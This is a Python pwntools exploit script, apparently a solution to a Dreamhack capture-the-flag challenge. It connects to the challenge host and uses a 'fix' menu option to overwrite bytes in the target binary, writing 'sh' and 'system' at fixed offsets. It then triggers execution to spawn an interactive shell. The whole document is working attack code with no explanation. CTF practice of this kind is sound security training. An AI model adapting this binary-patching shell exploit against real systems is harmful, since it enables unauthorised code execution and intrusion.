from pwn import *

HOST, PORT = 'host3.dreamhack.games', 19034
r = remote(HOST, PORT)

def fix(pos, val):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b': ', b'%d'%pos)
    r.sendlineafter(b': ', b'y')
    r.sendlineafter(b': ', b'%d'%val)

def execute():
    r.sendlineafter(b'>> ', b'4')

s = b'sh\x00'
s1 = b'system'

for i in range(len(s)):
    fix(0x2004+i, s[i])
for i in range(len(s1)):
    fix(0x492+i, s1[i])

execute()

r.interactive()